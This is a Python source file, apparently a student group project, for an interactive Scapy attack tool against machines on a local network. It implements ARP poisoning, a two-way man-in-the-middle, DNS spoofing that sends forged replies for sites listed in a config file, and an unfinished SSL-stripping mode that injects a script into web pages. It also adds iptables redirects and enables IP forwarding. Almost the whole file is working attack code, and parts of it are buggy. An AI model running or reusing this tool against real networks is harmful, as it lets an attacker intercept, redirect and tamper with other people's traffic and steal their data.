from scapy.all import *
from scapy.all import ARP, DNS, Ether, IP, UDP, DNS, DNSQR, DNSRR, TCP
#from scapy.all import Ether, ARP, get_if_addr, conf, sendp
import argparse
from time import sleep
import re # regex for ip validation
import sys
import traceback
import threading
import platform # to support windows and linux
if platform.system() == "Windows":
    import win32serviceutil # to turn on/off IP forwarding on Windows
    
import datetime
from collections import OrderedDict

"""
ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)

Steps to achieve ARP poisoning:
1. Choose victim machine on the same network
2. Get IP address of victim
3. Continuously send ARP packets (with arbitrary MAC-adress) using scapy to victim machine
4. Choosing the MAC-adress of the router will force the traffic, which usually goes from victim -> router, to flow from victim -> this machine

"""
# command line tool parser
parser = argparse.ArgumentParser(description="This program is an ARP poisoning tool")
args = parser.parse_args()

def print_banner():
    """
    Print some ASCII art for aesthetic purposes
    """
    banner="""
    _   ___ ___ ___ 
   /_\ | _ \ _ \ _ \\
  / _ \|   /  _/  _/
 /_/ \_\_|_\_| |_|  
                  By group 20
    """
    print(banner)

if sys.version_info[0] >= 3:
    raw_input = input
elif sys.version_info[0] < 3:
    input = raw_input


print("""Testing SSL stripping, ARPPV1.0.4.py is different from ARPPV1.0.3.py in the sense that this version might break, 
      if you want to use the stable code with DNS spoofing use ARPPV1.0.3.py or ARPPV1.0.2.py""")
class ARPP(object):
    def __init__(self):
        """The __init__ defines some attributes of the class helping with: 
        choice of interface, the menu options, and multi threading for arp poisoning 
        """
        self.SELECTED_INTERFACE = None
        self.TASK_DICT = OrderedDict([("menu",self.print_menu),\
            ("help",parser.print_help),\
            ("scan local network for users",self.get_network_users_ARPSCAN),\
            ("select interface",self.select_interface),\
            ("arp poison",self.ARP_poison),\
            ("arp mitm",self.ARP_MITM),\
            ("DNS spoofing",self.DNS_spoof_startup),\
            ("SSL stripping",self.SSLstrip),\
            ("show running threads",self.show_arp_poisoning_threads),\
            ("end a threaded task", self.end_task),\
            ("end all threaded tasks",self.end_all_threads),\
            ("exit",sys.exit)])
        #self.TASK_DICT = collections.OrderedDict(sorted(self.TASK_DICT_temp.items())) #sorting ditcionary by keys
        self.THREADED_TASKS = []
        self.EVENTS = []
        self.system_os = platform.system() # returns either 'Windows' 'Linux' or 'Mac'
    
    def _get_my_ip(self):
        """This is a helper method for obtaining your IP adress on the selected interface.

        Returns:
            str : IP address of this machine on selected interface
        """
        my_ip = get_if_addr(self.SELECTED_INTERFACE)
        return my_ip
    
    def _get_my_mac(self):
        """This is a helper method for obtaining your mac adress on the selected interface

        Returns:
            str : MAC address of this machine on selected interface
        """
        self._assure_interface_is_selected()
        return get_if_hwaddr(self.SELECTED_INTERFACE)
            
    def _assure_interface_is_selected(self):
        """This is a helper method which helps in making sure that there is 
        an interface selected by the user before the program proceeds.
        """
        while self.SELECTED_INTERFACE is None:
            self.select_interface()
    
    def _get_mac_from_ip(self, ip):
        """This is a helper method which helps in obtaining the MAC address of a given IP address on a local network.

        Args:
            ip (str): The IP address of a machine on the network

        Returns:
            str : The MAC address associated to te given IP address
        """
        self._assure_interface_is_selected()
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = broadcast / arp_request
        answ = srp(pkt, timeout=1, verbose=False, iface=self.SELECTED_INTERFACE)[0]
        if answ.res == []:
            return None
        else:
            return answ[0][1].hwsrc

    def _represents_int(self, i):
        """This helper method helps in determining whether a given input represents an integer or not

        Args:
            i (str): some arbitrary input

        Returns:
            bool : True if i represents an integer and otherwise False
        """
        try: 
            int(i)
        except ValueError:
            return False
        else:
            return True
    
    def _is_valid_ip(self, ip):
        """This helper method helps making sure that a given IP address is a valid one, which is here programmed to 
        be True when all octets are between 0 and 255 when written in decimal.

        Args:
            ip (str): A given IP address whose validity needs to be checked

        Returns:
            bool : True if IP is a valid IP address
        """
        try:
            return [0<=int(x)<256 for x in re.split('\.',re.match(r'^\d+\.\d+\.\d+\.\d+$',ip).group(0))].count(True)==4
        except:
            return False

    def print_menu(self):
        """This method displays the options/actions to choose from
        """
        task_names = list(self.TASK_DICT.keys())
        for i, task_name in enumerate(task_names, start=0):
            print("{}: {}".format(i, task_name))


    def get_ip_range(self, ip_range=None):
        if ip_range is None:
            ip_range = self._get_my_ip()+"/24"
        return ip_range

    def select_interface(self):
        if self.system_os == 'Windows':
            self.select_interface_windows()
        elif self.system_os in ['Linux', "Mac"]:
            self.select_interface_linux()
        else: # try to use the linux interface selection if system_os is not considered in if-statement
            self.select_interface_linux()
        
    def select_interface_linux(self):
        # code breaks for Windows here
        print("Which interface would you like to use:")
        iflist = get_if_list()
        for i, _ in enumerate(iflist, start=0):
            print("{}: {}".format(i,_))
        
        answer = None
        while answer is None:
            try:
                answer = str(input("select interface>>"))
            except:
                answer = None
            
        if self._represents_int(answer):
            answer = int(answer)
            if answer>=0 and answer<len(iflist):
                self.SELECTED_INTERFACE=iflist[answer]
                print("[+] selected {}".format(self.SELECTED_INTERFACE))
            else:
                print("[-] Interface does not exist\n")
        elif answer in iflist:
            self.SELECTED_INTERFACE = answer
        else:
            print("[-] Interface does not exist\n")
    
    def select_interface_windows(self):
        """The main issue is that for windows the selected interface has to be of type scapy.arch.windows.NetworkInterface
        and cannot be a string. Hence we need to handle the selection of the interface differently for windows.
        """
        if_list = get_windows_if_list()
        # display all interface names to user
        for i, interface_dict in enumerate(if_list,start=0):
            print("{}         {}".format(i, interface_dict['name']))
        
        # get user choice
        answer = None
        while answer is None:
            try:
                answer = str(input("select interface>>"))
            except:
                answer = None
        
        # verify that choice is valid
        if self._represents_int(answer):
            answer = int(answer)
            if answer >= 0 and answer < len(if_list):
                selected_interface_dict = if_list[answer]
                selected_interface_name = selected_interface_dict['name']
                self.SELECTED_INTERFACE = IFACES.dev_from_name( selected_interface_name )
                print("[+] selected {}".format(selected_interface_name))
                #get_windows_if_list()[4]['name']
            else:
                print("[-] Interface does not exist\n")
        elif not self._represents_intd(answer):
            ifs_names = [if_dict['name'] for if_dict in if_list]
            if answer in ifs_names:
                self.SELECTED_INTERFACE = IFACES.dev_from_name( answer )
                print("[+] selected {}".format(answer))
            else:
                print("[-] Interface does not exist\n")
        
        
    def get_network_users_ARPSCAN(self):
        """
        ARP ping scan
        """
        self._assure_interface_is_selected()
        
        # create the packet
        ip_range = self.get_ip_range()
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
        print("[+] Finding devices connected to network, please wait...")
        print("[+] Selected Interface: {}".format(self.SELECTED_INTERFACE))
        
        # doing srp(request) will return a tuple with results as first element and unanswered packets as second element
        results = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
        for i, req_and_reply in enumerate(results, start=0):
            print("{}          {}".format(req_and_reply[1].psrc, req_and_reply[1].hwsrc)) #req_and_reply = [request packet, reply packet], we want to read the reply in this case
        print("\n")
        
        # if there are no replies found, let the user know
        if results.res == []:
            print("[-] No network devices found\n")

    def _ip_routing_linux_onoff(self, switch):
        """This method turns the IP forwarding on (switch=1) or off (switch=0). 
        On linux it's easy to turn IP forwarding on/off.
        We need to access the ip_forwarding file in the system configuartions, and change the value it contains (either 0 or 1).

        Args:
            switch (int): 1 to turn IP forwarding on, 0 to turn IP forwarding off.
        """
        # the following path points to a file containing a 1 if ip_routing is enabled and 0 otherwise
        # have to be root to perform this operation
        path = "/proc/sys/net/ipv4/ip_forward"
        with open(path) as f:
            if f.read()=="{}".format(switch):
                return
        with open(path, "w") as f: # replaces the content in the file with new content
            f.write("{}".format(switch))
        
    def _ip_routing_windows_onoff(self, switch):
        """There are two ways of enabling/disabling IP forwarding on Windows, using either one of the modules:
        >>> import winreg
        >>> import win32serviceutil
        
        With the winreg module we may change the value of IPEnableRouter to 1 or 0 in order to turn on/off IP forwarding.
        With the win32serviceutil module we may start or stop the RemoteAccess (or SharedAccess, I don't know for sure) to turn on/off IP forwarding.
        Note that both modules require root privileges. 
        There is no difference between these modules besides the fact that the winreg module is a low level 
        module and the win32serviceutil is high level module (and thus a bit safer). The win32serviceutil module provides a more 
        standardised way of starting a windows service and hence we chose to use the win32serviceutil. 
        
        Args:
            switch (int): 1 to turn IP forwarding on, 0 to turn IP forwarding off.
        """
        # Get the current status of the Internet Connection Sharing (ICS) service
        service_name = "SharedAccess"
        status = win32serviceutil.QueryServiceStatus(service_name)[1]
        
        try:
            if switch == 1:
                print("[i] Turning IP forwarding on...")
                # if status is not 4 then it's not on, so we must turn it on
                if status != 4: 
                    win32serviceutil.StartService(service_name)
                    print("[+] IP forwarding turned on")
                else:
                    print("[+] IP forwarding already turned on")
            elif switch == 0:
                print("[i] Turning IP forwarding off...")
                # if status is 4 then it's on, and we must want to turn it off
                if status == 4: 
                    win32serviceutil.StopService(service_name)
                    print("[+] IP forwarding turned off")
                else:
                    print("[+] IP forwarding already turned off")
        except:
            print("[-] Failed to turn IP forwarding on/off")
    
    def _ip_routing_onoff(self, switch):
        if self.system_os.lower() == "windows":
            self._ip_routing_windows_onoff(switch=switch)
        elif self.system_os.lower() in ["linux", "mac"]:
            self._ip_routing_linux_onoff(switch=switch)
    
    
    def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
        """
        Victim's arp table will contain the following entry
        ----------
        ...
        ipToSpoof at macAttacker
        ...
        ----------

        Args:
            ipVictim (str): IP address of the victim machine
            ipToSpoof (str): IP address that our MAC address needs to be associated with in the victim's ARP table
        """
        self._assure_interface_is_selected()
        self._ip_routing_onoff(switch=1) # turn on IP forwarding
        
        while not self._is_valid_ip(ipVictim):
            try:
                ipVictim = str(input("ip of victim>>"))
            except SyntaxError:
                pass
            except KeyboardInterrupt:
                break
        
        while not self._is_valid_ip(ipToSpoof):
            try:
                print("[i] The ip to spoof is the ip you want your mac address to be associated to in the victim's arp table")
                ipToSpoof = str(input("ip to spoof>>"))
            except SyntaxError:
                pass
            except KeyboardInterrupt:
                break
        
        macVictim = self._get_mac_from_ip(ipVictim)
        if macVictim is None:
            print("[-] MAC address of {} could not be found, victim is possibly no longer connected to network.".format(ipVictim))
            return
        macAttacker = self._get_my_mac()
                
        
        pkt = Ether() / ARP()
        pkt[Ether].src = macAttacker
        pkt[ARP].hwsrc = macAttacker
        pkt[ARP].psrc  = ipToSpoof
        pkt[ARP].hwdst = macVictim
        pkt[ARP].pdst  = ipVictim
        
        print("[+] ARP poisoning {} -> {} started".format(ipToSpoof, ipVictim))
        e = threading.Event()
        def rec(event):
            while True:
                if event.isSet():
                    try:
                        print("[i] Healing ARP table...")
                        macOfSpoofedIp = self._get_mac_from_ip(ipToSpoof)
                        packet = Ether(src=macOfSpoofedIp)/ARP(hwsrc=macOfSpoofedIp, psrc=ipToSpoof, hwdst=macVictim, pdst=ipVictim)
                        sendp( packet, iface=self.SELECTED_INTERFACE, verbose=False )
                    except:
                        pass
                    break
                sendp( pkt, iface=self.SELECTED_INTERFACE, verbose=False )
                sleep(2)
        
        T = threading.Thread(target=rec, name="ARP poisoning {} -> {}".format(ipToSpoof, ipVictim), args=(e,))
        
        self.THREADED_TASKS.append(T)
        self.EVENTS.append(e)
        self.THREADED_TASKS[-1].start()
    
    def ARP_MITM(self):
        """Method for performing a MITM attack using ARP poisoning
        """
        self._assure_interface_is_selected()
        
        ipVictim = ""
        ipRouter = ""
        while not self._is_valid_ip(ipVictim):
            try:
                ipVictim = str(input("ip1>>"))
            except SyntaxError:
                pass
        while not self._is_valid_ip(ipRouter):
            try:
                ipRouter = str(input("ip2>>"))
            except SyntaxError:
                pass
        self.ARP_poison(ipVictim=ipVictim, ipToSpoof=ipRouter)
        self.ARP_poison(ipVictim=ipRouter, ipToSpoof=ipVictim)
    
    def show_arp_poisoning_threads(self):
        """A method that allows the user to list all running threaded tasks
        """
        # print all running threaded tasks
        alive_tasks_names = {}
        for i,task in enumerate(self.THREADED_TASKS,start=0):
            alive_tasks_names[i] = task.getName()
            if task.is_alive():
                print("{}: {}".format(i, task.getName()))
        
        # if there are no running tasks, let user know
        if not alive_tasks_names:
            print("[i] There are no running threads")
        
    def end_task(self):
        """A method that allows the user to end 1 task from a list of tasks
        """
        print("From the following threads select the processes to terminate:")
        # List the names of tasks that may be ended by the user
        alive_tasks_names = {}
        for i,task in enumerate(self.THREADED_TASKS,start=0):
            alive_tasks_names[i] = task.getName()
            if task.is_alive():
                print("{}: {}".format(i, task.getName()))
                
        # get the task the user wants to terminate and try to terminate it
        try:
            ttk_id = int(raw_input("Task to terminate>>"))
            self.EVENTS[ttk_id].set() # stops the thread
            del self.THREADED_TASKS[ttk_id] # remove thread from list of threads 
            del self.EVENTS[ttk_id] # remove the event corresponding to the thread also
        except:
            tb = traceback.format_exc()
            print(tb)
    
    def DNS_spoof_startup(self):
        """This method is the entry point to the DNS spoofing option from the menu. 
        Here the input is obtained from the user.
        """
        self._assure_interface_is_selected()
        
        # Route UDP packets on port 53 (which includes DNS requests) to 127.0.0.1 which is the local DNS server. 
        os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 127.0.0.1")
        
        # get IP of victim as input
        answer = ""
        try:
            while not self._is_valid_ip(answer):
                answer = str(input("ip of victim>>"))
        except KeyboardInterrupt:
            pass
        
        # start the DNS spoofing
        self.DNS_spoof(ipVictim=answer)
    
    def DNS_spoof(self, ipVictim=""):
        """This method implements the actual DNS spoofing.

        Args:
            ipVictim (str, optional): The IP of the victim that you want to DNS spoof. Defaults to "".
        """
        # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
        target_sites_map = {}
        with open("target_sites_DNS.conf", "r") as f:
            for line in f.readlines():
                if not line.startswith("#"):   
                    splitline = line.split("|")
                    site, site_map = splitline[0].strip().encode(), splitline[1].strip()
                    target_sites_map[site]=site_map
        loc_dns = "127.0.0.1" # corresponding to iptable ip address that packet is routed to
        
        DPH = DNSPacketHandler(loc_dns, self.SELECTED_INTERFACE)
        
        # this function is called on each packet in the sniff call further ahead
        def packet_callback(packet):
            return DPH.send_response(packet, target_sites_map)
                        
        # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
        # the threading.Event() is used to stop the thread when the user wants (by using e.set())
        e=threading.Event()
        def rec(event):
            try:
                while True:
                    sniff(timeout=3, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback, count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
                    if event.is_set():
                        break
            except:
                print("Something went wrong in the DNS spoofer, check the log file")
                with open("log.log", "a") as f:
                    f.write("{}\n".format(datetime.datetime.now()))
                    f.write(traceback.format_exc())
        
        T = threading.Thread(target=rec, name="DNS spoofing user with IP {}".format(ipVictim), args=(e,))
        
        # add the thread and event to the class contained list of threads and events
        # finally, start the DNS spoofing
        self.THREADED_TASKS.append(T)
        self.EVENTS.append(e)
        self.THREADED_TASKS[-1].start()
        print("[+] Started DNS spoofing user with IP {}".format(ipVictim))
    
    def SSLstrip_startup(self):
        """This method is the entry point to the SSL stripping option from the menu. 
        Here the input is obtained from the user.
        """
        self._assure_interface_is_selected()
        
        # Route TCP packets on port 80 or 443 (which includes DNS requests) to 127.0.0.1 which is the local DNS server. 
        # os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 127.0.0.1")
        # os.system("iptables -t nat -A PREROUTING -p tcp --sport 80 -j DNAT --to 127.0.0.1")
        # os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to 127.0.0.1")
        # os.system("iptables -t nat -A PREROUTING -p tcp --sport 443 -j DNAT --to 127.0.0.1")
        
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
        
        # get IP of victim as input
        answer = ""
        try:
            while not self._is_valid_ip(answer):
                answer = str(input("ip of victim>>"))
        except KeyboardInterrupt:
            pass
        
        # start the SSL stripping
        self.SSLstrip()
    
    def SSLstrip(self):
        # Create packet_callback from SSL stripping class
        SSLS = SSLstripping(selected_interface=self.SELECTED_INTERFACE)
        def packet_callback(packet):
            return SSLS.handle_packet(packet)
        
        
        # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
        # the threading.Event() is used to stop the thread when the user wants (by using e.set())
        e=threading.Event()
        def rec(event):
            try:
                while True:
                    sniff(timeout=3, count=100, filter="tcp port 8080", prn=packet_callback, iface=self.SELECTED_INTERFACE)
                    if event.is_set():
                        break
            except:
                print("Something went wrong during SSL stripping, check the log file")
                tb = traceback.format_exc()
                with open("log_sslstrip.log", "a") as f:
                    f.write("{}\n".format(datetime.datetime.now()))
                    f.write(tb)
                print(tb)
        
        T = threading.Thread(target=rec, name="SSL stripping", args=(e,))
        
        # add the thread and event to the class contained list of threads and events
        # finally, start the DNS spoofing
        self.THREADED_TASKS.append(T)
        self.EVENTS.append(e)
        self.THREADED_TASKS[-1].start()
        print("[+] Started SSL stripping")
        
    def end_all_threads(self):
        """A method to provide a fast way of ending all threads that are alive, 
        for memory leak prevention purposes and user convenience
        """
        if self.THREADED_TASKS != []:
            print("[+] closing threads... please wait\n")
            for e in self.EVENTS:
                e.set()
            del self.EVENTS
            del self.THREADED_TASKS
            self.EVENTS = []
            self.THREADED_TASKS = []
        

    def parse_command(self, command):
        """All commmands supplied by the user in the interface are parsed here and start the task corresponding to the command

        Args:
            command (str): The command to be executed
        """
        if command == "": # if there is no command, don't give the '[-] command not found' feedback
            pass
        elif self._represents_int(command): # if the user supplies an integer command corresponding to a menu option
            command = int(command)
            try:
                # get the task name and execute the task; if it's the exit command, make sure to end all running threads
                task_name = list(self.TASK_DICT.keys())[command]
                task = self.TASK_DICT[task_name]
                if task == sys.exit:
                    self.end_all_threads()
                task()
            except IndexError as e:
                print("[-] Command not found\n")
        else: # if the user supplies a string command corresponding to a menu option
            try:
                task = self.TASK_DICT[command]
                if task == sys.exit:
                    self.end_all_threads()
                task()
            except KeyError:
                print("[-] Command not found\n")
                

    def CLI(self):
        """This method takes in user input and passes it to the parse_command method
        """
        try:
            command = raw_input(">>") #rawrawrawsputin
            command = str(command).strip() # remove trailing spaces
            self.parse_command(command=command)
        except SyntaxError:
            pass


class DNSPacketHandler(object):
    def __init__(self, loc_dns_server, selected_interface):
        self.LOC_DNS_SERVER = loc_dns_server
        self.SELECTED_INTERFACE = selected_interface
        
    
    def forward_dns(self, dns_packet):
        """_summary_

        Args:
            dns_packet (_type_): _description_

        Returns:
            _type_: _description_
        """
        print("Forwarding: {}".format(dns_packet[DNSQR].qname))
        response = sr1(IP(dst='8.8.8.8')/
                    UDP(sport=dns_packet[UDP].sport)/
                    DNS(rd=1, id=dns_packet[DNS].id, qd=DNSQR(qname=dns_packet[DNSQR].qname)),
                    verbose=0)
        resp_dns_packet = IP(dst=dns_packet[IP].src, src=self.LOC_DNS_SERVER)/UDP(dport=dns_packet[UDP].sport)/DNS()
        resp_dns_packet[DNS] = response[DNS]
        send(resp_dns_packet, verbose=0)
        return "Responding to {}".format(dns_packet[IP].src)
    
    def forward_modified_dns(self, dns_packet, new_qname_decoded):
        """_summary_
        >>> self.forward_modified_dns(packet, "www.youtube.com") # will send DNS request for youtube and return IP to victim

        Args:
            dns_packet (Scapy packet): _description_
            new_qname_decoded (str): _description_

        Returns:
            _type_: _description_
        """
        new_qname=new_qname_decoded.encode()
        print("Modifying {} to {}".format(dns_packet[DNSQR].qname, new_qname))
        # note that in the DNS layer of the result below the query name has been changed to a new one
        response = sr1(IP(dst='8.8.8.8')/
                    UDP(sport=dns_packet[UDP].sport)/
                    DNS(rd=1, id=dns_packet[DNS].id, qd=DNSQR(qname=new_qname)),
                    verbose=0)
        resp_dns_packet = IP(dst=dns_packet[IP].src, src=self.LOC_DNS_SERVER)/UDP(dport=dns_packet[UDP].sport)/DNS()
        resp_dns_packet[DNS] = response[DNS]
        send(resp_dns_packet, verbose=0)
        return "Responding to {}".format(dns_packet[IP].src)
            
    def forward_packet(self, packet):
        """Forwarding of arbitrary packets

        Args:
            packet (Scapy packet): _description_
        """
        sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)

    def send_response(self, packet, target_sites_map):
        """_summary_

        Args:
            packet (_type_): _description_
            target_sites_map (_type_): _description_
        """
        try:
            target_sites= list(target_sites_map.keys())
            fake_ips    = list(target_sites_map.values())
            
            # if it is a 'DNS' 'query' that has 0 'answer count' aka 0 answers
            if (DNS in packet\
                and packet[DNS].opcode == 0\
                and packet[DNS].ancount == 0):
                
                qname= packet[DNSQR].qname
                qname_decoded = qname.decode("utf-8")
                
                
                # if the DNS query is for a website that we are targeting
                if qname in target_sites:
                    print("[+] Caught DNS request from {} for {}".format(packet[IP].src, qname_decoded))
                    
                    # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
                    index_of_target_site = target_sites.index(qname)
                    fake_ip = fake_ips[index_of_target_site]
                    
                    # create a fake DNS reply packet
                    # maybe it is missing the right flags for it to be meaningful to the victim device
                    fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
                        /UDP(dport=packet[UDP].sport, sport=53)\
                        /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=fake_ip))\
                        /DNSRR(rrname=qname, rdata=fake_ip)
                    
                    # send the fake packet on the selected interface
                    send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
                    print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, qname_decoded))
                
                # if the DNS query is not for a website we're targeting
                else:
                    self.forward_dns(packet)
            else:
                self.forward_packet(packet)
        except:
            tb = traceback.format_exc()
            print(tb)
            with open("log.log", "a") as f:
                f.write(tb + "\n")


class SSLstripping(object):
    """Note that TLS V1.0 has officially replaced SSL V3.0 and that SSL has been deprecated but 
    people still say SSL stripping sometimes rather than TLS stripping/ 

    Args:
        object (_type_): _description_
    """
    def __init__(self, selected_interface):
        self.SELECTED_INTERFACE = selected_interface
        self.initial_http = True
    
    # def modify_request(self, packet):
    #     # Retrieve the HTTP request layer
    #     request = packet[http.HTTPRequest]
        
    #     # Replace "https://" with "http://" in the Host field
    #     request.Host = request.Host.replace("https://", "http://")
        
    #     # Delete checksum and length fields, will be recalculated by Scapy
    #     del request.chksum
    #     del packet[IP].len
    #     del packet[TCP].chksum
        
    #     # Update the packet's raw payload with the modified request
    #     packet[Raw].load = str(request)
        
    #     return packet
    
    def sslstrip_packet(self, packet):
        if TCP in packet and Raw in packet:
            raw_payload = packet[Raw].load

            # Check if it's an HTTPS request
            if b"CONNECT" in raw_payload:
                # Modify the request to target the destination HTTP server
                modified_payload = raw_payload.replace(b"CONNECT", b"GET")
                packet[Raw].load = modified_payload

                # Remove the TLS layer from the packet
                del packet[TCP].payload

                # Recalculate IP and TCP checksums
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

        return packet
        # if response[TCP].dport == 80: 
        #     # if the response is already http we don't need to do anything
        #     pass
        # elif response[TCP].dport==443:
        #     # if the response if https
        #     del response[TCP].dport
        #     response[TCP].dport = 80
        #     response[Raw].load = response[Raw].load.replace("https", "http")
        #     response[Raw].load = response[Raw].load.replace("HTTPS", "HTTP")
        
        #     # Delete checksum and length fields, will be recalculated by Scapy
        #     del response.chksum
        #     del response[IP].len
        #     del response[TCP].chksum
            
        # return response

    def modify_content(self, packet):
        if Raw in packet:
            # Retrieve the raw payload of the packet
            raw_payload = packet[Raw].load

            # Modify the content of the web page (e.g., injecting scripts)
            modified_payload = raw_payload.replace("</body>", "<script> alert('XSS')</script></body>")
            packet[Raw].load = modified_payload

            # Recalculate TCP checksum
            del packet[TCP].chksum

        return packet
    
    
        # if Raw in response:
        #     # Retrieve the raw payload of the packet
        #     raw = response[Raw]
            
        #     # Modify the content of the web page (e.g., injecting scripts)
        #     raw.load = raw.load.replace("</body>", "<script>alert('XSS')</script></body>")
            
        #     # Recalculate checksums and lengths
        #     del response[IP].len
        #     del response[TCP].chksum
            
        # return response

    def forward_packet(self, packet):
        """Forwarding of arbitrary packets

        Args:
            packet (Scapy packet): _description_
        """
        sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)


    def handle_packet(self, packet):
        # global initial_http
        # global sslstrip
        if TCP in packet:
            print("got packet from {}".format(packet[Ether].src))

        if TCP in packet and Raw in packet:
            raw_payload = packet[Raw].load

            if b"GET" in raw_payload:
                # Step 2: Initial HTTP Connection
                if self.initial_http:
                    packet = self.modify_content(packet)
                    send(packet, iface=self.SELECTED_INTERFACE)
                    self.initial_http = False
                else:
                    # Subsequent HTTP requests
                    response = sr1(packet)

                    if response and TCP in response:
                        # Step 4: SSL Stripping
                        response = self.sslstrip_packet(response)

                        # Step 5: Content Modification
                        response = self.modify_content(response)

                        # Send the modified response to the user's browser
                        send(response, iface=self.SELECTED_INTERFACE)
        else:
            pass
    
    # def handle_packet(self, packet):
    #     # server -> me : sport = http(s)
    #     # me -> server : dport = http(s)
        
    #     if TCP in packet:
    #         if packet[TCP].dport in [80,443]:    # if we have an HTTP(S) request
    #             # send packet and get response
    #             response = sr1(packet, iface=self.SELECTED_INTERFACE)
                
    #             # if the response is https then we turn it into http
    #             if response and response[TCP].sport==443:
    #                 # Step 4: HTTPS to HTTP Conversion
    #                 response = self.modify_response_to_http(response)
                    
    #                 # Step 5: Content Modification
    #                 response = self.modify_content(response)
                    
    #                 # Send the modified response to the user's browser
    #                 sendp(response, iface=self.SELECTED_INTERFACE)
    #         else:
    #             self.forward_packet(packet)
    

def main():
    # create the class and start the command line interface
    cl = ARPP()
    print_banner()
    cl.print_menu()
    try:
        while True:
            cl.CLI()
    except KeyboardInterrupt:
        cl.end_all_threads() #prevent memory leak when interrupting
    

if __name__=="__main__":
    main()